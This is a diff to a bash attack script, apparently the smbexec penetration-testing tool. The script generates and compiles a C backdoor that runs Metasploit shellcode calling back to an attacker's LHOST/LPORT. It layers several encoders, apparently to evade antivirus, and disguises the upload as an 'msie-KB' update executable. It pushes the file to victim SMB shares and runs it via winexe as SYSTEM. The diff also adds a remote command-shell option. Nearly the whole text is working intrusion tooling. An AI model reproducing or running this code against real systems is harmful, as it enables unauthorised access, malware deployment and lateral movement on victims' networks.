@@ -43,7 +43,7 @@ fi
 # http://www.nullsecurity.net/tools/binary.html
 # If you have a 64bit system ensure you have configured wine properly to run 32 bit on 64Bit arch
 # or you have set up multiarch otherwise this will fail
-enable_crypter=1
+#enable_crypter=1
 
 trap f_ragequit 2
 
@@ -162,15 +162,14 @@ echo -e "\e[1;34m[*]\e[0m Let's get your payload setup...\n"
 		unset p
 		enumber=$((RANDOM%12+3))
 		seed=$((RANDOM%10000+1))
-		if [[ "${paychoice}" -le "2" ]]; then p=" SessionCommunicationTimeout=600"; fi
-                echo -e "#include <sys/types.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <time.h>\n#include <ctype.h>\n#include <windows.h>\nDWORD WINAPI exec_payload(LPVOID lpParameter)\n{\n\tasm(\n\t\"movl %0, %%eax;\"\n\t\"call %%eax;\"\n\t:\n\t:\"r\"(lpParameter)\n\t:\"%eax\");\n\treturn 0;\n}\nvoid sys_bineval(char *argv)\n{\n\tsize_t len;\n\tDWORD pID;\n\tchar *code;\n\tlen = (size_t)strlen(argv);\n\tcode = (char *) VirtualAlloc(NULL, len+1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\tstrncpy(code, argv, len);\n\tWaitForSingleObject(CreateThread(NULL, 0, exec_payload, code, 0, &pID), INFINITE);\n}\n\nunsigned char ufs[]=" > ${logfldr}/backdoor.c
-                for (( i=1; i<=10000;i++ )) do echo ${RANDOM} ${i}; done | sort -k1| cut -d " " -f2| head -${seed} | sed 's/$/"/' | sed 's/^/"/' | sed '$a;' >> ${logfldr}/backdoor.c
-                msfpayload "${payload}" LHOST="${lhost}" LPORT="${port}"${n} EXITFUNC=thread R | msfencode -e x86/jmp_call_additive -c ${enumber} -t raw | msfencode -e x86/call4_dword_xor -c ${enumber} -t raw | msfencode -e x86/shikata_ga_nai -c ${enumber} -t raw | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX | sed 's/^/void main()\n{\n\tchar *micro = \"/' | sed '$ s/$/"/' | sed '$a;' >> ${logfldr}/backdoor.c
-                echo -e "\tsys_bineval(micro);\n\texit(0);\n}\nunsigned char tap[]=" >> ${logfldr}/backdoor.c
-                for (( i=1; i<=999999;i++ )) do echo ${RANDOM} ${i}; done | sort -k1| cut -d " " -f2| head -${seed} | sed 's/$/"/' | sed 's/^/"/'| sed '$a;' >> ${logfldr}/backdoor.c
-                echo -e "\n\e[1;34m[*]\e[0m Compiling executable..."
-                ${mingw} -Wall ${logfldr}/backdoor.c -o ${logfldr}/backdoor.exe > /dev/null 2>&1
-                rm ${logfldr}/backdoor.c
+		echo -e "#include <sys/types.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <time.h>\n#include <ctype.h>\n#include <windows.h>\nDWORD WINAPI exec_payload(LPVOID lpParameter)\n{\n\tasm(\n\t\"movl %0, %%eax;\"\n\t\"call %%eax;\"\n\t:\n\t:\"r\"(lpParameter)\n\t:\"%eax\");\n\treturn 0;\n}\nvoid sys_bineval(char *argv)\n{\n\tsize_t len;\n\tDWORD pID;\n\tchar *code;\n\tlen = (size_t)strlen(argv);\n\tcode = (char *) VirtualAlloc(NULL, len+1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\tstrncpy(code, argv, len);\n\tWaitForSingleObject(CreateThread(NULL, 0, exec_payload, code, 0, &pID), INFINITE);\n}\n\nunsigned char ufs[]=" > ${logfldr}/backdoor.c
+		for (( i=1; i<=10000;i++ )) do echo ${RANDOM} ${i}; done | sort -k1| cut -d " " -f2| head -${seed} | sed 's/$/"/' | sed 's/^/"/' | sed '$a;' >> ${logfldr}/backdoor.c
+		msfpayload "${payload}" LHOST="${lhost}" LPORT="${port}" EXITFUNC=thread R | msfencode -e x86/jmp_call_additive -c ${enumber} -t raw | msfencode -e x86/call4_dword_xor -c ${enumber} -t raw | msfencode -e x86/shikata_ga_nai -c ${enumber} -t raw | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX | sed 's/^/void main()\n{\n\tchar *micro = \"/' | sed '$ s/$/"/' | sed '$a;' >> ${logfldr}/backdoor.c
+		echo -e "\tsys_bineval(micro);\n\texit(0);\n}\nunsigned char tap[]=" >> ${logfldr}/backdoor.c
+		for (( i=1; i<=999999;i++ )) do echo ${RANDOM} ${i}; done | sort -k1| cut -d " " -f2| head -${seed} | sed 's/$/"/' | sed 's/^/"/'| sed '$a;' >> ${logfldr}/backdoor.c
+		echo -e "\n\e[1;34m[*]\e[0m Compiling executable..."
+		${mingw} -Wall ${logfldr}/backdoor.c -o ${logfldr}/backdoor.exe > /dev/null 2>&1
+		#rm ${logfldr}/backdoor.c 
 		strip --strip-debug ${logfldr}/backdoor.exe
 
 		if [ -z "${enable_crypter}" ]; then
@@ -949,36 +948,38 @@ fi
 f_getinfo(){
 clear
 f_banner
-echo -e "\e[1;34m[*]\e[0m Let's get some info to finalize the attack...\n"
-if [ -z "${LPATH}" ]; then LPATH=${logfldr}/backdoor.exe; fi
-read -p "Please enter the name of a writable share on the victim. [C$] : " SMBShare
-if [ -z "${SMBShare}" ]; then SMBShare="C$"; fi
-# Check to see if the admin share is being used
-if [ "${SMBShare}" == "ADMIN$" ]; then
-	isadmin=1
-	prepath="\\Windows" # Need to add a prepath for the smbwinexe command to work properly
-fi
-# Check for a share with $ that is not C$
-share=$(echo ${SMBShare} | grep '\$' | grep -v 'ADMIN\$')
-if [ ! -z "${share}" ] && [ "${share}" != "C$" ]; then
-sharecheck=$(echo ${share} | cut -d "$" -f1) # Trim the $ off for the winexe share value
-oddshare="${sharecheck}:"
-fi
-# Check for a 1 letter share without a $
-onelettershare=$(echo ${SMBShare} | egrep -i '\<[e-z]\>')
-if [ ! -z "${onelettershare}" ]; then
-	SMBShare="${onelettershare}"
-	oddshare="${SMBShare}:"
-fi
-echo " Please provide the path to place the exe on the remote host."
-echo -n " Hit enter to place in root of share or enter path (ex: \\\\Temp): "
-read -p "" RPATH
-sharecheck=$(echo ${SMBShare} | cut -d "$" -f1)
-if [ -z "${RPATH}" ] && [ -z "${isadmin}" ] && [ -z "${oddshare}" ]; then
-	superoddshare=1
-fi
-if [ -z "${RPATH}" ] && [ "${SMBShare}" == "C$" ]; then
-	cemptyrpath=1
+if [ "${sysexpchoice}" != "5" ]; then
+	echo -e "\e[1;34m[*]\e[0m Let's get some info to finalize the attack...\n"
+	if [ -z "${LPATH}" ]; then LPATH=${logfldr}/backdoor.exe; fi
+	read -p "Please enter the name of a writable share on the victim. [C$] : " SMBShare
+	if [ -z "${SMBShare}" ]; then SMBShare="C$"; fi
+	# Check to see if the admin share is being used
+	if [ "${SMBShare}" == "ADMIN$" ]; then
+		isadmin=1
+		prepath="\\Windows" # Need to add a prepath for the smbwinexe command to work properly
+	fi
+	# Check for a share with $ that is not C$
+	share=$(echo ${SMBShare} | grep '\$' | grep -v 'ADMIN\$')
+	if [ ! -z "${share}" ] && [ "${share}" != "C$" ]; then
+	sharecheck=$(echo ${share} | cut -d "$" -f1) # Trim the $ off for the winexe share value
+	oddshare="${sharecheck}:"
+	fi
+	# Check for a 1 letter share without a $
+	onelettershare=$(echo ${SMBShare} | egrep -i '\<[e-z]\>')
+	if [ ! -z "${onelettershare}" ]; then
+		SMBShare="${onelettershare}"
+		oddshare="${SMBShare}:"
+	fi
+	echo " Please provide the path to place the exe on the remote host."
+	echo -n " Hit enter to place in root of share or enter path (ex: \\\\Temp): "
+	read -p "" RPATH
+	sharecheck=$(echo ${SMBShare} | cut -d "$" -f1)
+	if [ -z "${RPATH}" ] && [ -z "${isadmin}" ] && [ -z "${oddshare}" ]; then
+		superoddshare=1
+	fi
+	if [ -z "${RPATH}" ] && [ "${SMBShare}" == "C$" ]; then
+		cemptyrpath=1
+	fi
 fi
 f_smbauth
 unset p
@@ -992,7 +993,6 @@ elif [[ -e ${tf} ]]; then
 	RHOSTS=${tf}
 else
 	echo -en "   Invalid IP or file does not exist.\n"
-	f_insideprompt
 fi
 f_run_as_system
 f_getsome
@@ -1010,26 +1010,46 @@ f_sd(){
 xdg-open http://www.youtube.com/watch?v=cWb2Im55fL8 >& /tmp/smbexec/ddmdjunk
 f_mainmenu
 }
+
 # The name says it all...get your popcorn ready...
 f_getsome(){
-cat /dev/urandom| tr -dc '0-9'|head -c 6 > /tmp/smbexec/filename.rnd #create a random filename
-SMBFilename="msie-KB$(cat /tmp/smbexec/filename.rnd)-enu.exe" #set value for random filename
-echo -e "\n\e[1;34m[*]\e[0m Duck and Cover...Possible Falling Shells Ahead\n"
-#prevents rage-quit while remote processes are in play
-dirty=1
+if [ "${sysexpchoice}" != "5" ]; then
+	cat /dev/urandom| tr -dc '0-9'|head -c 6 > /tmp/smbexec/filename.rnd #create a random filename
+	SMBFilename="msie-KB$(cat /tmp/smbexec/filename.rnd)-enu.exe" #set value for random filename
+	echo -e "\n\e[1;34m[*]\e[0m Duck and Cover...Possible Falling Shells Ahead\n"
+else
+	echo -e "\n\e[1;34m[*]\e[0m Let's see if we can't get you a command prompt\n"
+fi
+
+if [ "${sysexpchoice}" != "5" ]; then 
+	#prevents rage-quit while remote processes are in play
+	dirty=1
+fi
+
 for i in $(cat "${RHOSTS}"); do
 	# Force display output to a file. showconnect provides us an IP for the cleanup function
-	${smbexecpath}/smbexeclient //${i}/${SMBShare} -A /tmp/smbexec/smbexec.auth -c "put ${LPATH} ${RPATH}\\${SMBFilename} ; showconnect" >& /tmp/smbexec/connects.tmp 
+	if [ "${sysexpchoice}" == "5" ]; then
+		${smbexecpath}/smbexeclient //${i}/IPC$ -A /tmp/smbexec/smbexec.auth -c "showconnect" >& /tmp/smbexec/connects.tmp 
+	else
+		${smbexecpath}/smbexeclient //${i}/${SMBShare} -A /tmp/smbexec/smbexec.auth -c "put ${LPATH} ${RPATH}\\${SMBFilename} ; showconnect" >& /tmp/smbexec/connects.tmp 
+	fi
 	# Check to see what type of error we got so we can tell the user
 	f_smbauthinfo
 	f_smbauthresponse
-	if [ "${uploadpayload}" == "1" ];then
+	if [ "${uploadpayload}" == "1" ] && [ "${sysexpchoice}" != "5" ];then
 		echo -e "\e[1;32m[+]\e[0m Uploading and attempting to execute payload..."
 	fi
 	# Get successful IP addy for cleanup later
 	ConnCheck=$(cat /tmp/smbexec/connects.tmp | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u)
 	# If no successful connection was made above this portion is skipped
-	if [ -s /tmp/smbexec/success.chk ] && [ -z "${badshare}" ]; then
+	if [ "${sysexpchoice}" == "5" ] && [ -s /tmp/smbexec/success.chk ]; then
+		if [ -z ${isxrunning} ]; then
+			screen -mS ${i}-Command_Shell -t "Command_Shell" bash -c "${smbexecpath}/smbwinexe --uninstall ${get_system} -A /tmp/smbexec/smbexec.auth //${i} CMD"
+		else
+			xterm -geometry 90x25 -T "${i}-Command Shell" -e ${smbexecpath}/smbwinexe --uninstall ${get_system} -A /tmp/smbexec/smbexec.auth //${i} "cmd" &
+			sleep 2
+		fi
+	elif [ -s /tmp/smbexec/success.chk ] && [ -z "${badshare}" ]; then
 		echo ${ConnCheck} >> /tmp/smbexec/hosts.loot.tmp # Place successful connection IPs into a holding file for the cleanup function
 		if [ "${isadmin}" == "1" ]; then
 			ADMINPATH=${prepath}${RPATH}
@@ -1048,19 +1068,23 @@ for i in $(cat "${RHOSTS}"); do
 			${smbexecpath}/smbwinexe ${get_system} -A /tmp/smbexec/smbexec.auth //${i} "cmd /C ${RPATH}\\${SMBFilename}" &> /tmp/smbexec/error.jnk &
 		fi
 		echo $! >> /tmp/smbexec/winexe.pid #grab the pid so we can kill it
-	fi
+		
 	#Unset the variables because we're in a for-loop
 	unset logonfail
 	unset connrefused
 	unset badshare
 	unset unreachable
+	fi
 done
-if [ -s /tmp/smbexec/hosts.loot.tmp ]; then
+if [ -s /tmp/smbexec/hosts.loot.tmp ] && [ "${sysexpchoice}" != "5" ]; then
 	echo -e "\n\e[1;34m[*]\e[0m Ready for cleanup!  Hit enter when the shells stop rolling in..."
 	read
+	f_cleanup
+else
+	f_mainmenu
 fi
-f_cleanup
 }
+
 f_cleanup(){
 # Cleaning up the victims - killing exploit procs & removing the exe file
 # Only those with successful logins will be hit again
@@ -1151,14 +1175,16 @@ echo "1. Remote system access"
 echo "2. Create an executable and rc script"
 echo "3. Disable UAC"
 echo "4. Enable UAC"
-echo "5. Main Menu"
+echo "5. Remote Command Shell"
+echo "6. Main Menu"
 read -p "Choice: " sysexpchoice
 case "${sysexpchoice}" in
 	1) f_vanish ;;
 	2) f_vanish ;;
 	3) f_uac_setup ;;
 	4) f_uac_setup ;;
-	5) f_mainmenu ;;
+	5) f_getinfo ;;
+	6) f_mainmenu ;;
 	*) f_system_exploitation_menu ;;
 esac
 }
